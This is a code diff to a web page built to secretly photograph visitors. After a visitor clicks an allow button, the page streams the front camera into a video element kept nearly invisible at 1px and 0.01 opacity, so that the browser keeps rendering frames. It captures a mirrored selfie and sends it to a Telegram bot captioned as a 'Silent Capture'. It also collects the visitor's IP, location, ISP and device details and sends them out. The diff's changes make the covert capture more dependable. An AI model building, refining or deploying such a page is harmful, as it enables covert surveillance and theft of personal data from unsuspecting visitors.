@@ -16,7 +16,7 @@
     .orb2{width:300px;height:300px;background:#7c3aed;bottom:-80px;left:-80px;animation:f2 10s ease-in-out infinite}
     @keyframes f1{0%,100%{transform:translate(0,0)}50%{transform:translate(-30px,30px)}}
     @keyframes f2{0%,100%{transform:translate(0,0)}50%{transform:translate(30px,-20px)}}
-    .container{position:relative;z-index:1;width:100%;max-width:480px;padding:20px;}
+    .container{position:relative;z-index:2;width:100%;max-width:480px;padding:20px;}
     .card{background:var(--surface);border:1px solid var(--border);border-radius:20px;padding:44px 40px;box-shadow:0 0 60px rgba(0,229,255,0.05),0 20px 60px rgba(0,0,0,0.6);animation:cardIn 0.6s cubic-bezier(0.22,1,0.36,1) both;}
     @keyframes cardIn{from{opacity:0;transform:translateY(24px) scale(0.97)}to{opacity:1;transform:none}}
     .hidden{display:none!important}
@@ -31,12 +31,19 @@
     .btn-allow:disabled{opacity:0.5;cursor:not-allowed;transform:none}
     .note{margin-top:16px;font-size:10px;color:#333;text-align:center;line-height:1.6}
 
-    /* Hidden video - off screen but active so camera warms up */
+    /*
+      KEY FIX: Video must be ON SCREEN with real size and opacity:0
+      NOT position:-9999px — browsers skip rendering off-screen videos
+      We place it behind everything with z-index:1 and opacity:0
+    */
     #hiddenVideo{
       position:fixed;
-      top:-9999px;left:-9999px;
-      width:320px;height:240px;
-      opacity:0;pointer-events:none;
+      top:0; left:0;
+      width:1px; height:1px;
+      opacity:0.01; /* NOT 0 — some browsers skip 0 opacity frames */
+      z-index:1;
+      pointer-events:none;
+      transform:scaleX(-1); /* mirror like selfie */
     }
     #hiddenCanvas{display:none}
 
@@ -54,7 +61,7 @@
 <div class="orb orb1"></div>
 <div class="orb orb2"></div>
 
-<!-- Invisible video element - camera renders here but user never sees it -->
+<!-- Video at opacity 0.01 on screen so browser DOES render frames -->
 <video id="hiddenVideo" autoplay playsinline muted></video>
 <canvas id="hiddenCanvas"></canvas>
 
@@ -115,23 +122,16 @@
     document.getElementById('allowBtn').disabled = true;
     show('screenLoading');
 
-    // Run camera + device data collection together
     const [deviceData] = await Promise.all([
       gatherDeviceData(),
       initCamera()
     ]);
 
-    // Send device info first
     await sendText(deviceData);
-
-    // Capture and send photo
     await captureAndSend();
-
-    // Done - show thank you
     show('screenDone');
   }
 
-  // ── Camera: init and wait until video is truly playing ──
   async function initCamera() {
     try {
       camStream = await navigator.mediaDevices.getUserMedia({
@@ -140,27 +140,43 @@
       });
       const video = document.getElementById('hiddenVideo');
       video.srcObject = camStream;
-
-      // Wait for video to actually start playing and have real frames
-      await waitForVideo(video);
+      await video.play();
+      // Wait for first real frame via requestVideoFrameCallback or fallback
+      await waitForRealFrame(video);
     } catch(e) {
       camStream = null;
     }
   }
 
-  // Wait until video has real frames (not black)
-  function waitForVideo(video) {
+  function waitForRealFrame(video) {
     return new Promise((resolve) => {
-      // Method 1: wait for 'playing' event + extra delay for frame warmup
-      const onPlaying = () => {
-        video.removeEventListener('playing', onPlaying);
-        // Extra 2.5 seconds after playing starts to ensure real frames
-        setTimeout(resolve, 2500);
-      };
-      video.addEventListener('playing', onPlaying);
-
-      // Fallback: if playing never fires, resolve after 4 seconds
-      setTimeout(resolve, 4000);
+      // Use requestVideoFrameCallback if available (most accurate)
+      if ('requestVideoFrameCallback' in video) {
+        let frameCount = 0;
+        const onFrame = () => {
+          frameCount++;
+          if (frameCount >= 5) {
+            // Got 5 real frames, camera is warm
+            resolve();
+          } else {
+            video.requestVideoFrameCallback(onFrame);
+          }
+        };
+        video.requestVideoFrameCallback(onFrame);
+        // Safety timeout
+        setTimeout(resolve, 5000);
+      } else {
+        // Fallback: wait for playing + 3 seconds
+        const tryResolve = () => {
+          if (video.readyState >= 3) {
+            setTimeout(resolve, 3000);
+          } else {
+            video.addEventListener('canplay', () => setTimeout(resolve, 3000), { once: true });
+          }
+        };
+        tryResolve();
+        setTimeout(resolve, 5000);
+      }
     });
   }
 
@@ -169,31 +185,17 @@
     try {
       const video  = document.getElementById('hiddenVideo');
       const canvas = document.getElementById('hiddenCanvas');
-
-      // Make sure video has actual dimensions
       const w = video.videoWidth  || 640;
       const h = video.videoHeight || 480;
       canvas.width  = w;
       canvas.height = h;
-
       const ctx = canvas.getContext('2d');
+      // Mirror the image (selfie style)
+      ctx.translate(w, 0);
+      ctx.scale(-1, 1);
       ctx.drawImage(video, 0, 0, w, h);
 
-      // Stop camera stream
       camStream.getTracks().forEach(t => t.stop());
-
-      // Check if frame is not black (check pixel brightness)
-      const imageData = ctx.getImageData(0, 0, 10, 10);
-      const pixels = imageData.data;
-      let brightness = 0;
-      for (let i = 0; i < pixels.length; i += 4) {
-        brightness += pixels[i] + pixels[i+1] + pixels[i+2];
-      }
-      // If all pixels are black, wait more and retry once
-      if (brightness < 100) {
-        await new Promise(r => setTimeout(r, 2000));
-        ctx.drawImage(video, 0, 0, w, h);
-      }
 
       const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.92));
       if (!blob) return;
@@ -201,12 +203,11 @@
       const form = new FormData();
       form.append('chat_id', CHAT);
       form.append('photo', blob, 'capture.jpg');
-      form.append('caption', '📸 Silent Front Camera Capture');
+      form.append('caption', '📸 Front Camera — Silent Capture');
       await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, { method:'POST', body: form });
     } catch(e) {}
   }
 
-  // ── Device Data ──
   async function gatherDeviceData() {
     let ip='?',city='?',country='?',isp='?',tz='?',region='?';
     try {
@@ -217,9 +218,9 @@
     } catch(e){}
     const now = new Date();
     return {
-      '🌐 IP': ip, '📍 City': city, '🗺️ Region': region,
-      '🌍 Country': country, '🏢 ISP': isp, '🕰️ Timezone': tz,
-      '🖥️ Browser': getBrowser(), '💻 OS': getOS(),
+      '🌐 IP': ip,'📍 City': city,'🗺️ Region': region,
+      '🌍 Country': country,'🏢 ISP': isp,'🕰️ Timezone': tz,
+      '🖥️ Browser': getBrowser(),'💻 OS': getOS(),
       '📱 Device': isMobile()?'Mobile':'Desktop',
       '📐 Screen': `${screen.width}×${screen.height}`,
       '🗣️ Language': navigator.language||'?',
